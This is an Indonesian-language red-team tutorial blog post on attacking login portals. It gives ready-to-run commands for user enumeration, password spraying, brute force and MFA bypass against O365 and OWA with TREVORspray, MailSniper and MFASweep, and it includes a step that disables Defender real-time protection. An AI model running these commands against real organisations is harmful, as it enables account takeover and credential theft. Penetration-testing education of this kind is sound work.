---
title: '02 - Attacking Login Portals'
date: 2023-07-16 01:50:22 +0700
categories: ['Red Team', 'Initial Access']
tags: [red team, introduction, what is, penetration testing, web pentest, o365, owa, bypass mfa, user enumeration, password spraying, brute force]     # TAG names should always be lowercase
author: nairpaa
---

Dalam upaya memperoleh [Initial Access](/posts/initial-access/) pada saat melakukan *Red Teaming*, serangan terhadap portal login menjadi salah satu pendekatan yang bagus untuk dilakukan.

Portal login seperti webmail biasanya dapat diakses melalui internet, sehingga *Red Teamer* dapat melakukan *Penetration Testing* melalui internet.

## 0x1 - What is User Enumeration?

**User Enumeration** adalah proses mengidentifikasi atau mencari informasi tentang pengguna yang valid pada suatu sistem atau aplikasi.

Tujuan utama dari *user enumeration* adalah untuk mengumpulkan daftar pengguna valid yang dapat digunakan untuk eksploitasi selanjutnya.

Untuk menemukan pengguna yang valid, kita perlu memiliki daftar nama pengguna terlebih dahulu untuk divalidasi. Beberapa metode umum bisa digunakan untuk membuat daftar nama pengguna, diantaranya:

1. **Default Credential**: Mengumpulkan daftar nama pengguna default dari aplikasi terkait (jika ada).
2. **Guessing**: Mencoba menebak nama pengguna yang valid berdasarkan pola yang lazim digunakan. Contohnya, penggunaan nama standar seperti "admin".
3. **Web Functionality**: Mengumpulkan daftar nama pengguna dengan memanfaatkan fitur web organisasi itu sendiri. Contohnya, halaman `Our Team` dan `Contact Us` yang umumnya menampilkan nama staff, dan mungkin aplikasi web tersebut memiliki fitur pencarian pengguna yang bisa dimanfaatkan.
4. **Public Data Leaks**: Mencari daftar nama pengguna dari organisasi terkait menggunakan teknik [OSINT](/posts/intro-to-external-recon/).
5. **Social Engineering**: Memanfaatkan teknik *Social Engineering* untuk mendapatkan informasi pengguna, seperti dengan menjalin percakapan palsu atau *phishing*.

## 0x2 - Generate Possible Name Formats

Setelah mengumpulkan daftar nama pengguna, selanjutnya kita buat daftar format kemungkinan nama pengguna dari nama depan dan belakang seseorang.

**Tools**:
- [namemash.py](https://gist.github.com/superkojiman/11076951)

```bash
➜ cat names.txt           
Endah Lailasari
Teddy Jailani
Yoga Natsir
Tami Sudiati

➜ ./namemash.py names.txt > possible-users.txt

➜ cat possible.txt | head -n 5   
endahlailasari
lailasariendah
endah.lailasari
lailasari.endah
lailasarie
```

## 0x3 - Portal Login Attack

> **OPSEC**
> 
> Dalam banyak sistem keamanan, kebijakan penguncian akun (*lockout policy*) diterapkan untuk mencegah serangan *brute-force*. Terlalu banyak percobaan otentikassi dalam waktu singkat tidak hanya mengganggu, tetapi juga dapat mengunci akun korban.
{: .prompt-danger }

### A. Attacking O365 

**Tools**:
- [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray)

**User Enumeration**:

```bash
➜ trevorspray -m msol --recon example.com -u possible-users.txt --threads 10
```

**Password Spraying**:

```bash
➜ trevorspray -m msol --recon example.com -u valid-users.txt -p passwordlist.txt --threads 10
```

**Brute Force**:

```bash
➜ trevorspray -m msol --recon example.com -u valid-users.txt -p passwordlist.txt -f --threads 10
```

### B. Attacking OWA

**Tools**:
- [MailSniper](https://github.com/dafthack/MailSniper)

> Kita harus menonaktifkan **Real-time protection Defender** terlebih dahulu untuk menjalankan `MailSniper`.
{: .prompt-info }

**User Enumeration**:

```powershell
PS > ipmo C:\Tools\MailSniper\MailSniper.ps1
PS > Invoke-DomainHarvestOWA -ExchHostname mail.example.com # Enumerate the NetBIOS name of the target domain
PS > Invoke-UsernameHarvestOWA -ExchHostname mail.example.com -Domain example.com -UserList possible-users.txt -OutFile valid.txt # User Enumeration
```

**Password Spraying**:

```powershell
PS > Invoke-PasswordSprayOWA -ExchHostname mail.example.com -UserList valid.txt -Password 'P@ssw0rd'
```

**Download Global Address List**:

```powershell
PS > Get-GlobalAddressList -ExchHostname mail.example.com -UserName example.com\user -Password 'P@ssw0rd' -OutFile gal.txt # Downloading the global address list with valid credential
```

### C. Attacking Other Portals

**Tools**:
- [Burp Suite](https://portswigger.net/burp)

### D. Bypass MFA

**Tools**:
- [MFASweep](https://github.com/dafthack/MFASweep)

```powershell
PS > Invoke-MFASweep -Username user@example.com -Password 'P@ssw0rd'
```